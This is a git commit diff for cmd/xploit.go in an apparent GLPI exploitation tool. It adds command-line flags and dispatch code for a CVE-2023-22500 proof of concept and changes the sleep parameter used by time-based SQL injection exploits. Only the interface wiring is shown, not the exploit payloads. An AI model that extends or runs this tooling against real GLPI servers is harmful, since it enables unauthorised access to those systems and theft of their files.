551b27b4cff346c7f3b262c043583acfc5d6e17f
Feals-404 <171519f3-28bf-4269-af79-979e57bbe780@anonaddy.me>
2023-02-07 17:09:37 -0500

    Add POC for CVE-2023-22500

--- cmd/xploit.go
+++ cmd/xploit.go
@@ -7,11 +7,17 @@ import (
 	"github.com/spf13/cobra"
 )
 
-var sleep string
+var sleep *int
+var minfolder *int
+var maxfolder *int
+var minfile *int
+var maxfile *int
+var numRoutines *int
+
 var xploitCmd = &cobra.Command{
 	Use:     "xploit [url] [exploit]",
 	Short:   "Exploit the GLPI with a specified vulnerability",
-	Example: `GLPIAnarchy xploit https://glpi.example.com CVE-2020-15175`,
+	Example: `GLPIAnarchy xploit https://glpi.example.com CVE-2020-15175 [Optional flags]`,
 	Args:    cobra.MinimumNArgs(2),
 	Run: func(cmd *cobra.Command, args []string) {
 		target := exploits.NormalizeURL(args[0])
@@ -21,10 +27,15 @@ var xploitCmd = &cobra.Command{
 			if exploit == vulnerability.ID {
 				fmt.Print("\nExploiting " + target + " with " + exploit + "\n\n")
 				if vulnerability.TAG == "TB SQLi" {
-					vulnerability.RUNTBSQL(target, sleep)
+					vulnerability.RUNTBSQL(target, *sleep)
 					break
+				} else if vulnerability.ID == "CVE-2023-22500" {
+					exploits.CVE202322500(target, *numRoutines, *minfolder, *maxfolder, *minfile, *maxfile)
+
+				} else {
+					vulnerability.RUN(target)
 				}
-				vulnerability.RUN(target)
+
 			}
 		}
 
@@ -33,5 +44,12 @@ var xploitCmd = &cobra.Command{
 
 func init() {
 	rootCmd.AddCommand(xploitCmd)
-	xploitCmd.Flags().StringVarP(&sleep, "sleep", "s", "", "Sleep time for TB SQLi")
+
+	sleep = xploitCmd.Flags().IntP("sleep", "s", 5, "Sleep time for TB SQLi")
+	minfolder = xploitCmd.Flags().IntP("minfolder", "I", 0, "Min folder to start (For CVE-2023-22500)")
+	maxfolder = xploitCmd.Flags().IntP("maxfolder", "A", 50, "Max folder (For CVE-2023-22500)")
+	minfile = xploitCmd.Flags().IntP("filemin", "i", 0, "Min file to start (For CVE-2023-22500)")
+	maxfile = xploitCmd.Flags().IntP("filemax", "a", 10, "Max file (For CVE-2023-22500)")
+	numRoutines = xploitCmd.Flags().IntP("numroutine", "r", 5, "Number of go routines (For CVE-2023-22500)")
+
 }
